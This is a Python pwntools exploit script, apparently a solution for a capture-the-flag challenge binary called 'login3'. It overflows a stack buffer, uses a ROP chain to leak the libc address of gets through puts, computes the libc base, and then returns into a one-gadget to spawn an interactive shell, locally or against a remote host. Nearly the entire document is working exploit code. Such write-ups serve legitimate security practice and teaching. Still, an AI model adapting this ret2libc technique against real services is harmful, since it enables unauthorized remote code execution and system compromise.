#!/usr/bin/env python3
# -*- coding:utf-8 -*

from pwn import *
from sys import argv
from time import sleep

context.terminal = ['tmux', 'sp', '-h']
context.log_level = "debug"

chall = "./login3"
libc = ELF("./libc.so.6")
elf = ELF(chall)
context.binary = chall
context.binary.checksec()

if len(argv) >= 2 and argv[1] == "r":
    p = remote("example.com", 4444)
elif len(argv) >= 2 and argv[1] == "d":
	cmd = """
		c
	"""
	p = gdb.debug(chall,cmd)
else:
    p = process(chall)

# libc leak
payload = b"A" * 0x28# padding
payload += p64(0x4012d3)# pop rdi; ret
payload += p64(elf.got['gets'])
payload += p64(elf.plt['puts'])
payload += p64(elf.symbols['main'])

p.recvuntil(":")
p.sendline(payload)
p.recvuntil(b"Invalid ID\n")
gets_libc_addr = u64(p.recv(6) + b'\00' * 2)
log.info("gets@libc: " + hex(gets_libc_addr))
libc_base = gets_libc_addr - libc.symbols['gets']
log.info("libc base: " + hex(libc_base))

# One-Gadget RCE
one_gadget_offset = 0xe3b01
one_gadget_addr = libc_base + one_gadget_offset
log.info("One_Gadget@libc: " + hex(one_gadget_addr))

payload = b"A" * 0x28# padding
payload += p64(one_gadget_addr)

p.recvuntil(":")
p.sendline(payload)

p.interactive()
